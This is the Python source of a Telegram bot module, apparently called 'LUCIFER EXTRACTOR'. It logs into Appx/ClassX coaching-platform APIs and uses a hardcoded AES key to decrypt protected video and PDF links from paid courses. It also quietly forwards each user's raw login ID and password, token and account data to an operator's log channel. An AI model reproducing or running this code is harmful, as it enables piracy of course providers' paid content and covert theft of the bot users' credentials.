
import asyncio
import aiohttp
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from base64 import b64decode
from pyrogram import filters
import cloudscraper
from Extractor import app
import os
import base64
import time
import jwt
from config import PREMIUM_LOGS
from Extractor.modules.db import save_user_token

log_channel = PREMIUM_LOGS
def decrypt(enc):
    enc = b64decode(enc.split(':')[0])
    key = '638udh3829162018'.encode('utf-8')
    iv = 'fedcba9876543210'.encode('utf-8')
    if len(enc) == 0:
        return ""
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(enc), AES.block_size)
    return plaintext.decode('utf-8')

def decode_base64(encoded_str):
    try:
        decoded_bytes = base64.b64decode(encoded_str)
        decoded_str = decoded_bytes.decode('utf-8')
        return decoded_str
    except Exception as e:
        return f"Error decoding string: {e}"

async def fetch_item_details(session, api_base, course_id, item, headers, userid, app_name, path=None):
    fi = item.get("id")
    vt = item.get("Title", "")
    outputs = []  

    try:
        async with session.get(f"{api_base}/get/fetchVideoDetailsById?course_id={course_id}&folder_wise_course=1&ytflag=0&video_id={fi}", headers=headers) as response:
            if response.headers.get('Content-Type', '').startswith('application/json'):
                r4 = await response.json()
                data = r4.get("data")
                if not data:
                    return []

                appname = api_base.replace("https://", " ").replace("api.classx.co.in"," ").replace("api.akamai.net.in", " ").replace("api.teachx.in", " ").replace("api.cloudflare.net.in", " ")

                vt = data.get("Title", "")
                vl = data.get("download_link", "")

                if vl:
                    dvl = decrypt(vl)
                    #outputs.append(f"🗂️{vt}:{dvl}")
                    outputs.append(f"{vt}:https://appxapi.co/{app_name}/{course_id}/{fi}/{userid}.m3u8")
                else:
                    encrypted_links = data.get("encrypted_links", [])
                    for link in encrypted_links:
                        a = link.get("path")
                        k = link.get("key")

                        if a and k:
                            k1 = decrypt(k)
                            k2 = decode_base64(k1)
                            da = decrypt(a)
                            outputs.append(f"{vt}:https://appxapi.co/{app_name}/{course_id}/{fi}/{userid}.m3u8")
                            break
                        elif a:
                            da = decrypt(a)
                            outputs.append(f"{vt}:https://appxapi.co/{app_name}/{course_id}/{fi}/{userid}.m3u8")
                            break

                if "material_type" in data:
                    mt = data["material_type"]
                    if mt == "VIDEO":
                        p1 = data.get("pdf_link", "")
                        pk1 = data.get("pdf_encryption_key", "")
                        p2 = data.get("pdf_link2", "")
                        pk2 = data.get("pdf2_encryption_key", "")
                        if p1:
                            dp1 = decrypt(p1)
                            depk1 = decrypt(pk1)
                            outputs.append(f"{vt}:https://appxapi.co/{app_name}/{course_id}/{fi}/{userid}.pdf")
                        if p2:
                            dp2 = decrypt(p2)
                            depk2 = decrypt(pk2)
                            outputs.append(f"{vt}:https://appxapi.co/{app_name}/{course_id}/{fi}/{userid}.pdf")
            else:
                error_page = await response.text()
                print(f"Error: Unexpected response for video ID {fi}:\n{error_page}")
                return []
    except Exception as e:
        print(f"An error occurred while fetching details for video ID {fi}: {str(e)}")
        return []

    return outputs
    
                    
        
async def fetch_folder_contents(session, api_base, course_id, folder_id, headers, userid, app_name, path="Home"):
    outputs = []
    url = f"{api_base}/get/folder_contentsv3?course_id={course_id}&parent_id={folder_id}&windowsapp=false&start=0"

    try:
        async with session.get(url, headers=headers) as response:
            if response.status != 200:
                print(f"⚠️ Folder {folder_id} failed ({response.status})")
                return []

            j = await response.json()
            data = j.get("data", [])
            if not data:
                print(f"⚠️ Folder {folder_id} is empty")
                return []

            # Sequential folder recursion (prevents skipped folders)
            for item in data:
                title = item.get("Title", "Untitled").strip()
                mtype = item.get("material_type", "")
                current_path = f"{path} < {title}"

                if mtype == "FOLDER":
                    print(f"📂 Entering {current_path}")
                    sub_outputs = await fetch_folder_contents(
                        session, api_base, course_id, item["id"], headers, userid, app_name, path=current_path
                    )
                    outputs.extend(sub_outputs)
                else:
                    print(f"📄 Found {mtype}: {current_path}")
                    try:
                        item_outputs = await fetch_item_details(
                            session, api_base, course_id, item, headers, userid, app_name, path=current_path
                        )
                        outputs.extend(item_outputs)
                    except Exception as e:
                        print(f"💣 Error in {current_path}: {e}")

    except Exception as e:
        print(f"💣 Error fetching folder {folder_id}: {e}")

    return outputs

async def appex_v2_txt(app, message, api, name):
    api_base = api if api.startswith(("http://", "https://")) else f"https://{api}"
    raw_url = f"{api_base}/post/userLogin"
    raw_urll = f"{api_base}/post/userLogin?extra_details=0"
    app_name = api_base.replace("https://", "").replace("api.classx.co.in","").replace("api.akamai.net.in", "").replace("api.teachx.in", "").replace("api.cloudflare.net.in", "")
    hdr = {
        "Auth-Key": "appxapi",
        "User-Id": "-2",
        "Authorization": "",
        "User_app_category": "",
        "Language": "en",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate",
        "User-Agent": "okhttp/4.9.1"
    }
    info = {"email": "", "password": ""}
    input1 = await app.ask(message.chat.id, text=(f"Send **ID & Password** \n\n Coaching Name :- {app_name} \n\nSend like this: **ID*Password**\n\nOr send your **Token** directly."))
    raw_text = input1.text
    
    if '*' in raw_text:
        info["email"] = raw_text.split("*")[0]
        info["password"] = raw_text.split("*")[1]
        

        try:
            scraper = cloudscraper.create_scraper()
            res = scraper.post(raw_url, data=info, headers=hdr).content
            response = scraper.post(raw_urll, data=info, headers=hdr).content
            output = json.loads(res)
            shit = json.loads(response)
            userid = output["data"]["userid"]
            token = output["data"]["token"]
            put = shit["data"]
            await app.send_message(log_channel, put)
            await save_user_token(userid, token, api_base)
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            return await message.reply_text("Please try again later. Maybe Password Wrong")
    else:
        token = raw_text
        
        userid = jwt.decode(token, options={"verify_signature": False}).get("id")
    

    hdr1 = {
        "Client-Service": "Appx",
        "source": "website",
        "Auth-Key": "appxapi",
        "Authorization": token,
        "User-ID": userid
    }
    await save_user_token(userid, token, api_base)
    
    
    
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{api_base}/get/get_all_purchases?userid={userid}&item_type=10", headers=hdr1) as res1:
            j1 = await res1.json()

        FFF = "**COURSE-ID  -  COURSE NAME**\n\n"
        valid_ids = []
        if "data" in j1:
            for item in j1["data"]:
                for ct in item["coursedt"]:
                    i = ct.get("id")
                    cn = ct.get("course_name")
                    start = ct.get("start_date")
                    end = ct.get("end_date")
                    pricing = ct.get("price")
                    thumbnail = ct.get("course_thumbnail")
                    FFF += f"**`{i}`   -   `{cn}`**\n\n"
                    valid_ids.append(i)

        
        
        if len(FFF) <= 4096:
            editable1 = await message.reply_text(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅ for {app_name}\n\n {api_base}\n\n`{token}`\n{FFF}")
            dl=(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅ for 🔓{app_name} \n\n`{api_base}`\n\n`{raw_text}`\n\n`{token}`\n{FFF}")
            await app.send_message(log_channel, dl)
        else:
            plain_FFF = FFF.replace("**", "").replace("`", "")
            file_path = f"{app_name}.txt"
            with open(file_path, "w") as file:
                file.write(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅for {app_name}\n\nToken: {token}\n\n{plain_FFF}")
            await app.send_document(
            message.chat.id,
            document=file_path,
            caption="Too much batches so select batch id  from txt "
            )
            await app.send_document(log_channel, document=filepath , caption=  "Many Batch Found" )
            editable1 = None
        input2 = await app.ask(message.chat.id, text="**Now send the Course ID to Download**")
        raw_text2 = input2.text
        if raw_text2 not in valid_ids:
            await message.reply_text("** Invalid Course ID. Please send a valid Course ID from the list.**")
            await input2.delete(True)
            if editable1:
                await editable1.delete(True)
                return
            if editable1:
                await editable1.delete(True)
                await input2.delete(True)
        await message.reply_text("wait extracting your batch")
        start_time = time.time()
        
        async with session.get(f"{api_base}/get/folder_contentsv3?course_id={raw_text2}&parent_id=-1", headers=hdr1) as res2:
            j2 = await res2.json()
        if not j2.get("data"):
            return await message.reply_text("No data found in the response. Try switching to v3 and retry.")
        
        course_name = next((ct.get("course_name") for item in j1["data"] for ct in item["coursedt"] if ct.get("id") == raw_text2), "Course")
        sanitized_course_name = "".join(c if c.isalnum() else "_" for c in course_name)
        filename = f"{sanitized_course_name}.txt"

        all_outputs = []        
        tasks = []
        if "data" in j2:
            for item in j2["data"]:        
                tasks.append(fetch_item_details(session, api_base, raw_text2, item, hdr1, userid, app_name))
                if item["material_type"] == "FOLDER":
                    tasks.append(fetch_folder_contents(session, api_base, raw_text2, item["id"], hdr1, userid, app_name))
        if tasks:
            results = await asyncio.gather(*tasks)
            for res in results:
                if res:  
                    all_outputs.extend(res)  

        with open(filename, 'w') as f:
            for output_line in all_outputs:
                f.write(output_line + '\n')

        end_time = time.time()
        elapsed_time = end_time - start_time
        c_text = (
            f"╭━━━━━━━『 <b>🚀 COURSE INFO</b> 』━━━━━━━╮\n"
            f"📦 <b>App Name:</b> <code>{app_name}</code>\n"
            f"🎓 <b>Batch Name:</b> <code>{sanitized_course_name}</code>\n"
            f"🕒 <b>Validity:</b> <code>{start}</code> ➜ <code>{end}</code>\n"
            f"💰 <b>Price:</b> <code>{pricing}</code>\n"
            f"⏱️ <b>Extracted In:</b> <code>{elapsed_time:.1f}s</code>\n"
            f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
            f"╭━━━━━━━『 <b>💾 DOWNLOAD INFO</b> 』━━━━━━━╮\n"
            f"👑 <b>Admin:</b> <a href='https://t.me/NOOBHUSIR'>LUCIFER ⚡</a>\n"
            f"⚙️ <b>Extractor:</b> <code>LUCIFER EXTRACTOR ⚡</code>\n"
            f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
        )
        await app.send_document(message.chat.id, filename, caption=c_text)
        await app.send_document(log_channel, filename, caption = c_text)
        os.remove(filename)
        await message.reply_text("Done Bruh✅")


    
